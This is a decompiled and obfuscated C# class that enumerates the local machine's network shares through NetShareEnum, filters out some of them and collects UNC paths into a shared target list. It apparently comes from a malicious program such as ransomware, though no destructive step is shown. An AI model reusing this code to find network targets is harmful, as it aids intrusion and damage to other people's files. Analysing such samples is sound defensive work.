using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace jDlAujUelC;

public sealed class trzEGBFWWkP
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct LLaYRrOMTehFslTnX
	{
		public string yxmHfVulgtmDEXxh;

		public uint OzwwqIxVzvCF;

		public string yVAUmYDCxAB;

		public LLaYRrOMTehFslTnX(string string_0, uint uint_0, string string_1)
		{
			yxmHfVulgtmDEXxh = string_0;
			OzwwqIxVzvCF = uint_0;
			yVAUmYDCxAB = string_1;
		}

		public override string ToString()
		{
			return yxmHfVulgtmDEXxh;
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	public LLaYRrOMTehFslTnX[] tjjGoplGLbVBu(string string_0)
	{
		List<LLaYRrOMTehFslTnX> list = new List<LLaYRrOMTehFslTnX>();
		int int_ = 0;
		int int_2 = 0;
		int int_3 = 0;
		int num = Marshal.SizeOf(typeof(LLaYRrOMTehFslTnX));
		IntPtr intptr_ = IntPtr.Zero;
		StringBuilder stringBuilder_ = new StringBuilder(string_0);
		int num2 = NetShareEnum(stringBuilder_, 1, ref intptr_, uint.MaxValue, ref int_, ref int_2, ref int_3);
		if (num2 == 0)
		{
			IntPtr ptr = intptr_;
			for (int i = 0; i < int_; i++)
			{
				LLaYRrOMTehFslTnX item = (LLaYRrOMTehFslTnX)Marshal.PtrToStructure(ptr, typeof(LLaYRrOMTehFslTnX));
				list.Add(item);
				ptr += num;
			}
			NetApiBufferFree(intptr_);
			return list.ToArray();
		}
		list.Add(new LLaYRrOMTehFslTnX(getString_0(107350903) + num2, 10u, string.Empty));
		return list.ToArray();
	}

	[DllImport("Netapi32.dll", SetLastError = true)]
	private static extern int NetApiBufferFree(IntPtr intptr_0);

	[DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
	private static extern int NetShareEnum(StringBuilder stringBuilder_0, int int_0, ref IntPtr intptr_0, uint uint_0, ref int int_1, ref int int_2, ref int int_3);

	public static void lQjELCoROYSjjF()
	{
		try
		{
			string[] logicalDrives = Directory.GetLogicalDrives();
			LLaYRrOMTehFslTnX[] array = new trzEGBFWWkP().tjjGoplGLbVBu(Environment.MachineName);
			LLaYRrOMTehFslTnX[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				LLaYRrOMTehFslTnX lLaYRrOMTehFslTnX = array2[i];
				if (lLaYRrOMTehFslTnX.ToString().Contains(getString_0(107349425)) || lLaYRrOMTehFslTnX.ToString().Contains(getString_0(107349416)) || lLaYRrOMTehFslTnX.ToString().Contains(getString_0(107349439)) || lLaYRrOMTehFslTnX.ToString().Contains(getString_0(107407468)) || logicalDrives.Contains(lLaYRrOMTehFslTnX.ToString().Replace(getString_0(107356748), getString_0(107349398))))
				{
					continue;
				}
				if (!hNCHegfceoe.OtDxRoGRan.Contains(getString_0(107407519) + Environment.MachineName + getString_0(107397323) + lLaYRrOMTehFslTnX))
				{
					hNCHegfceoe.OtDxRoGRan.Add(getString_0(107407519) + Environment.MachineName + getString_0(107397323) + lLaYRrOMTehFslTnX);
				}
				if (hNCHegfceoe.IebLDrmorstxvf)
				{
					try
					{
						Console.WriteLine(getString_0(107349393), getString_0(107407519) + Environment.MachineName + getString_0(107397323) + lLaYRrOMTehFslTnX);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (hNCHegfceoe.LbhjvcCDDsZLYlccs)
			{
				try
				{
					File.AppendAllText(hNCHegfceoe.KymHhFbNcwDYA, getString_0(107349400) + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static trzEGBFWWkP()
	{
		Strings.CreateGetStringDelegate(typeof(trzEGBFWWkP));
	}
}
